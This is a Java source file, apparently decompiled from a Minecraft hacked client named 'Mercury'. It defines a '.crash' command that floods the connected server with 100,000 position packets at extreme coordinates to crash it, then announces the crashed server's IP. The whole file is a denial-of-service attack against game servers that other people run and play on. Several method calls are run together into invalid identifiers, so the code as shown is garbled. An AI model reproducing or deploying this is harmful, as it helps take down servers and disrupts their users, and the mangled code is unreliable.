package me.hexxed.mercury.commands;

import me.hexxed.mercury.Mercury;
import me.hexxed.mercury.commandbase.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;

public class Crash extends Command
{
  public Crash()
  {
    super("crash", ".crash");
  }
  
  public void execute(String[] args)
  {
    if (getMinecrafttheWorld == null) {
      return;
    }
    for (int i = 0; i < 100000; i++) {
      getMinecraftthePlayer.sendQueue.addToSendQueue(new net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition(3.0E7D, 1.0D, 3.0E7D, true));
    }
    me.hexxed.mercury.util.Util.sendInfo("Successfully crashed §b" + getMinecraftgetCurrentServerDataserverIP);
  }
}
